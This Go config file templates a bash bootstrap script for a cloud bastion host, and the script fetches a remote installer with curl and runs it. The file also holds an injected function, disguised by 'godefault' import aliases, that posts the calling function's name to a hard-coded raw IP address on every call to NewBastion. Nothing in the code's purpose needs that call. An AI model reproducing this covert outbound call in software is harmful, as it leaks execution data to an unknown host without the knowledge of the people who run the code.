package config

import (
	godefaultruntime "runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
)

const (
	bastionBashScript = `{{.Header}}

BASTION_BOOTSTRAP_FILE=bastion_bootstrap.sh
BASTION_BOOTSTRAP=https://s3.amazonaws.com/aws-quickstart/quickstart-linux-bastion/scripts/bastion_bootstrap.sh

curl -s -o $BASTION_BOOTSTRAP_FILE $BASTION_BOOTSTRAP
chmod +x $BASTION_BOOTSTRAP_FILE

# This gets us far enough in the bastion script to be useful.
apt-get -y update && apt-get -y install python-pip
pip install --upgrade pip &> /dev/null

./$BASTION_BOOTSTRAP_FILE --enable true
`
)

type BastionInput struct{ baseConfig }

func NewBastion(input *BastionInput) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	input.Header = defaultHeader
	return generate("bastion", bastionBashScript, input)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
